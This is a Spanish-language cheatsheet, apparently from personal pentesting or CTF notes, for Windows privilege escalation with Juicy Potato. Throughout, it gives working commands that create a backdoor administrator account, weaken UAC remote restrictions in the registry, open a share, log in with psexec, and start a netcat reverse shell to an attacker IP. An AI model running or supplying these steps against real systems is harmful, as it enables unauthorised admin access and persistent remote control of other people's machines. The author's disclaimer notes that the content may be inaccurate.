# Juicy Potato

En primer lugar te descargas el ejecutable directamente desde está URL [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)

Una vez lo tenemos descargado en nuestra máquina atacante lo podemos enviar a la máquina atacada a través de cualquier método de envío de archivos que conocemos "[Envío de archivos cheatsheet](../../../herramientas/envio-de-archivos-cheatsheet.md)"

## Creando un usuario

Una vez en la máquina atacada tenemos el archivo tenemos que ejecutarlo:

```
juicypotato.exe -l 443 -t * -p C:\Windows\System32\cmd.exe -a "/c net user shanks shanks123 /add"
```

Podríamos crear un archivo malicioso con msfvenom subirlo a la máquina atacada y llamarlo desde juicy, en un futuro explicaré el proceso.

Mucho ojo porque en función del sistema operativo el CLSID cambia, si hacemos systeminfo podemos ver en que SO nos encontramos. Podemos verlos en [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

Así que ahora podemos terminar de añadir lo que falta a nuestro código anterior:

```
juicypotato.exe -l 443 -t * -p C:\Windows\System32\cmd.exe -a "/c net user shanks shanks123 /add" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

Ahora si que hemos conseguido crear un usuario que se llama shanks en la máquina con la contraseña shanks123 pero no está en el grupo de administradores

```
net user shanks
#De hecho con crackmapexec no nos pone pwned
crackmapexec smb 10.10.10.55 -u 'shanks' -p 'shanks123'
```

Así que tenemos que añadirlo al grupo administradores:

```
juicypotato.exe -l 443 -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators shanks /add" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

Si al probar un crackmapexec seguimos sin tener pwned tenemos entonces que hacer un par de cosillas más.

* Modificar el registro
* Permisos en el shell

Así que en la máquina atacada

```
juicypotato.exe -l 443 -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
juicypotato.exe -l 443 -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

Ahora si tendríamos que tener el pwned en crackmapexec, así que podemos tirar de psexec:

```
psexec.py WORKGROUP/shanks@10.10.10.55
```

¡Estamos dentro con permisos de administrador!

## Obteniendo una nueva Reverse Shell

En primer lugar tendríamos que introducir en el equipo un binario de netcat de esta manera podremos ejecutarlo desde nuestro "Juicy"

Una vez tenemos el netcat debemos crear un archivo de la siguiente manera:

```
echo START C:\direccion\donde\este\nc.exe -e powershell.exe 10.10.10.10 1111 > shell.bat
```

Nos ponemos a la escucha en nuestra máquina y ejecutamos nuestro Juicy

```
sudo rlwrap nc -nlvp 1111

potato.exe -l 1337 -t * -p C:\direccion\donde\este\shell.bat -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

¡Y ya tenemos una shell con permisos de administrador!



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
